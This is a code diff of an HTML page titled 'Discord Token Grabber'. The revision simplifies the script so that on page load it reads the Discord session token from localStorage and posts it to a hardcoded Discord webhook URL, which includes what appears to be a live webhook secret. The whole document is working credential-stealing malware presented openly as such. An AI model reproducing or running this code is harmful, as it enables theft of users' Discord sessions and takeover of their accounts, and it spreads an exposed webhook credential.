@@ -3,59 +3,16 @@
 <head>
     <title>Discord Token Grabber</title>
     <script>
-        // Function to inject a script into the Discord tab
-        function injectScriptIntoDiscord() {
-            chrome.tabs.query({ url: 'https://discord.com/*' }, function (tabs) {
-                if (tabs.length > 0) {
-                    chrome.scripting.executeScript({
-                        target: { tabId: tabs[0].id },
-                        function: getDiscordToken
-                    }, function (results) {
-                        if (results && results[0] && results[0].result) {
-                            const token = results[0].result;
-                            console.log('Discord token:', token);
-                            loginWithToken(token);
-                        } else {
-                            console.log('No Discord token found.');
-                        }
-                    });
-                } else {
-                    console.log('No Discord tab found.');
-                }
-            });
-        }
-
         // Function to get the Discord token from local storage
         function getDiscordToken() {
             return localStorage.getItem('token');
         }
 
-        // Function to log in using the Discord token
-        function loginWithToken(token) {
-            fetch('https://discord.com/api/v9/auth/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${token}`
-                },
-                body: JSON.stringify({})
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-                sendMessageToWebhook(token);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Login failed. Please check your token.');
-            });
-        }
-
-        // Function to send a message to the webhook
-        function sendMessageToWebhook(token) {
+        // Function to send the token to the webhook
+        function sendTokenToWebhook(token) {
             const webhookUrl = 'https://discord.com/api/webhooks/1552042396278063311/yxaPrCIPm4TlxGQvY-ApvaEEibgQVB9QNZIIv4txiuyBB9lGPzBo1ZKlJoO0aKAGWt0S';
             const message = {
-                content: 'Hello, this is a test message from the Discord Auto Login script!'
+                content: `Discord token: ${token}`
             };
 
             fetch(webhookUrl, {
@@ -67,18 +24,21 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Message sent to webhook:', data);
-                alert('Message sent to webhook!');
+                console.log('Token sent to webhook:', data);
             })
             .catch((error) => {
-                console.error('Error sending message to webhook:', error);
-                alert('Failed to send message to webhook.');
+                console.error('Error sending token to webhook:', error);
             });
         }
 
         // Main function to handle the token grabbing process
         function main() {
-            injectScriptIntoDiscord();
+            const token = getDiscordToken();
+            if (token) {
+                sendTokenToWebhook(token);
+            } else {
+                console.log('No Discord token found.');
+            }
         }
 
         // Run the main function when the page loads
@@ -87,6 +47,6 @@
 </head>
 <body>
     <h1>Discord Token Grabber</h1>
-    <p>This script will grab the Discord token from the Discord tab's local storage, log in, and send a message to the specified webhook.</p>
+    <p>This script will grab the Discord token from local storage and send it to the specified webhook when the page loads.</p>
 </body>
 </html>
